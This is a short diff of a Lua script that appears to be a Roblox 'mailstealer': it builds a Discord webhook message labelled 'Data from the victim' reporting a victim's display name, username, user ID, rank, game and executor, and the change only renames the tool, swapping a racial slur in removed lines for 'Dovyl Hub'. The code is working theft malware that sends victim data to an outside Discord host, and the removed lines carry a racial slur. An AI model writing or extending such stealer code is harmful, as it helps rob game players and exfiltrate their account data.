@@ -51,10 +51,10 @@ local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/icons/1109197661652910210/c635dd13f1317b77ded3c73a19840db2.png",
   ["content"]= "**:money_mouth:New Hit With Pro Hub:money_mouth:** ||@here|| ",
-	["username"] = "Nigga Hub",
+	["username"] = "Dovyl Hub",
 	["embeds"]= {
 	  {
-		["title"]= "`Nigga Hub Mailstealer Results`",
+		["title"]= "`DOvyl Hub Mailstealer Results`",
 		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:money_mouth: Executor: "..exploit.."***",
 		["url"]= "https://discord.gg/scriptz",
 		["color"]= ""..webhookcolor.."",
